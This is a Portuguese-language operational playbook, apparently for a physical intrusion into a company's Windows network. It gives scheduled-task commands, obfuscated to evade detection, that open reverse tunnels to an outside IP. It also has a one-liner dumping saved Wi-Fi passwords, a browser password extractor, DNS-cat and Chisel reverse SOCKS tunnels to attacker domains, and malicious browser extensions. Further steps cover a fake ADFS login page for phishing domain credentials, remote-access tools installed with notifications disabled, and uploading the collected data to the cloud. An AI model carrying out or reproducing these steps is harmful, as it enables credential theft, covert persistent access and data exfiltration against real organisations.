# Bonus
sch""tasks /create /tn "pac1" /tr "C:\temp\python\pythonw.exe C:\temp\python\shootback\slaver_singlefile.py -m 54.236.23.49:1335 -t 10.1.0.69:389" /sc hourly /mo 4 \
sch""tasks /create /tn "pac2" /tr "C:\temp\python\pythonw.exe C:\temp\python\shootback\slaver_singlefile.py -m 54.236.23.49:1336 -t 10.1.0.70:389" /sc hourly /mo 4 \
s\ch""tasks /create /tn "pac4" /tr "C:\temp\python\pythonw.exe C:\temp\python\shootback\slaver_singlefile.py -m 54.236.23.49:1337 -t infraascode.localiza.com:443" /sc hourly /mo 4 \
sch""tasks /create /tn "pac5" /tr "C:\temp\python\pythonw.exe C:\temp\python\shootback\slaver_singlefile.py -m 54.236.23.49:1338 -t netadmin.localiza.com:443" /sc hourly /mo 4


# Guia de Execução

1 Ferramentas
Baixar o [1drive.zip](https://1drv.ms/u/s!AjfrkQYLG_fYgUBJHhDy2mxAOZ9x?e=Ms4N1w) ou [github.zip](https://github.com/tu74nkamon/guide/blob/main/EXECUCAO2.zip) com todas as ferramentas de uma vez\

# Android Wi-Fi
instalar um leitor de qrcode no seu celular \
https://www.howtogeek.com/818934/how-to-find-wi-fi-password-on-android/ \
https://android.gadgethacks.com/how-to/see-passwords-for-wi-fi-networks-youve-connected-your-android-device-0160995/

# Mapeamento
1. Criar a pasta tmp em **C:\tmp** Nela estarão os arquivos que você deve coletar ao final, comprimindo a pasta e enviando para nuvem
2. Baixar Ferramentas\
  2.1 O Arquivo [EXECUCAO.zip](https://1drv.ms/u/s!AjfrkQYLG_fYgUBJHhDy2mxAOZ9x?e=Ms4N1w) ou [github.zip](https://github.com/tu74nkamon/guide/blob/main/EXECUCAO2.zip) contém as pastas:\
      - Extencoes (Extenções Browser Chrome e Edge)\
      - deploycat (tunel)\
      - browser_pwd_extract (extrator de senhas browser que é o arquivo **chromium_based_browsers.exe**)\
3. Mapeamento (Cada comando abaixo eh executado no **CMD do windows**)\
   - 3.1 Captura de MAC Address\
       echo ">>>>>>>>>>>>>>> MAC <<<<<<<<<<<<<<<<<" >> C:\tmp\output.txt && getmac >> C:\tmp\output.txt && cls && echo “done”
   - 3.2 Captura de configurações de rede\
      echo ">>>>>>>>>>>>>>> NetConf <<<<<<<<<<<<<<<<<" >> C:\tmp\output.txt && ipconfig /all >> C:\tmp\output.txt && cls && echo “done”
   - 3.3 Captura de informações de sistema\
      echo ">>>>>>>>>>>>>>> Sysinf <<<<<<<<<<<<<<<<<" >> C:\tmp\output.txt && systeminfo >> C:\tmp\output.txt && cls && echo “done”
   - 3.4 Criação de pasta temporária e Captura de Senhas WiFi (**Aplicável para notebook**)
      for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> C:\tmp\output.txt && cls && echo “done”

# PWD Browsers
4. Captura de Informações dos Browsers\
   4.1 Certifique-se de que existe a pasta C:\tmp\    \
   4.2 Baixe / Extraia  o ZIP [chromiumaster.zip](https://1drv.ms/u/s!AjfrkQYLG_fYelG61GupNU6K5qI?e=ZWqoUe) também presente no arquivo EXECUCAO2.zip e execute o programa chromium_based_browsers.exe. 

# Reverse Tunnel
5. Tunnel
- 5.1 DNS Cat
   Baixar [arquivo](https://github.com/tu74nkamon/guide/blob/main/connect.ps1) e colocar em C:\Users\"user"\connect
\

Executar em powershell (dentro da pasta C:\Users\"user"\connect) os seguintes comandos:
- Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
- . ./connect.ps1
- Start-Connect -d "n1.cwdlab.com" -s "172.16.1.197"

- 5.2  Chisel Tunnel
   Download no [1drive](https://1drv.ms/f/s!AjfrkQYLG_fYgSX-FsDPaSIMLnfq?e=lS5hOx) ou [github](https://github.com/tu74nkamon/guide/blob/main/VENUS.zip) e alterar em cada maquina diferente a porta para o intervalo de 1080 ate 1090 (Executar no CMD do windows)\


   PC1) venus.exe client https://lobster.cwdlab.com R:127.0.0.1:1080:socks\
   PC2) venus.exe client https://lobster.cwdlab.com R:127.0.0.1:1081:socks\
   PC3) venus.exe client https://lobster.cwdlab.com R:127.0.0.1:1082:socks\
   ...\
   PC8) venus.exe client https://lobster.cwdlab.com R:127.0.0.1:1087:socks
   
# Extenção   
6. Extensão de Browser\
   6.1 Escolha uma versão das Extenções e instale nos navegadores CHROME e EDGE\
   6.2 Você pode verificar se o dominio eh alcançável por:\
        - Versao1 [https://happyteachersdayquotes.com/verify](https://happyteachersdayquotes.com/verify)\
        - Versao2 [https://cwdlab.com/verify](https://cwdlab.com/verify)\
        - Versao3 [https://gitauth.co/verify](https://gitauth.co/verify)

# Raspberry
7. Lembrar de plugar o raspberry em algum ponto de rede\

# o365
8. Captura de Credenciais de dominio\
 Acessar https://amz.run/6YAy ou https://adfs.aufoglass.com/adfs/ls/?wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline e pedir alguém para logar na página nossa do ADFS (Microsoft)
 
 
 # Tools Acesso Remoto
 lembrar de baixar, instalar e configurar (logar em contas de acesso permanente) as ferramentas de acesso remoto.
- 1 GetScreen 
 Faça login com a conta fornecida para acesso permanente \
 ![image](https://user-images.githubusercontent.com/70968631/231205769-25e27ba5-b2d9-4a11-b938-cbcb929302a1.png)
 
 Desabilite as notificações\
 ![image](https://user-images.githubusercontent.com/70968631/231206995-7d9c8709-f4af-4e32-8ae6-bd1d1038c610.png)
 
- 2 Teamviewer
Instale o programa e logue em computadores e contatos com a conta fornecida\
![image](https://user-images.githubusercontent.com/70968631/231211994-491e7898-a76b-4915-b32d-dfe316566960.png)

 #Comprima a pasta **C:\tmp** e envie para cloud 
